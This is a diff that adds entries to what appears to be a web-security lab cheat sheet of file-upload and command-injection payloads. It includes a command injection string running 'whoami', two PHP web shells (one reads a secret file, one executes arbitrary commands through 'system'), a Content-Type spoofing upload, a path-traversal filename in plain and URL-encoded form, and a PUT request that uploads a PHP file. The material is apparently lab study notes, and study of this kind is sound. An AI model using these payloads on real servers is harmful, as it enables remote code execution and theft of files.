@@ -263,3 +263,37 @@ email=||whoami>/var/www/images/output.txt||
 Read it:
 filename=output.txt
 ```
+
+- #####  Remote code execution via web shell upload
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+
+<?php system($_REQUEST['cmd']); ?>
+```
+
+- ##### Web shell upload via Content-Type restriction bypass
+```
+Content-Disposition: form-data; name="avatar"; filename="webshell1.php"
+Content-Type:  image/jpeg
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+- ##### Web shell upload via path traversal
+
+```
+filename="../webshell.php"
+
+# URL encoded
+filename="%2e%2e%2fwebshell.php"
+```
+- ##### Uploading files using PUT
+Some web servers may be configured to support PUT requests. If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.
+```
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
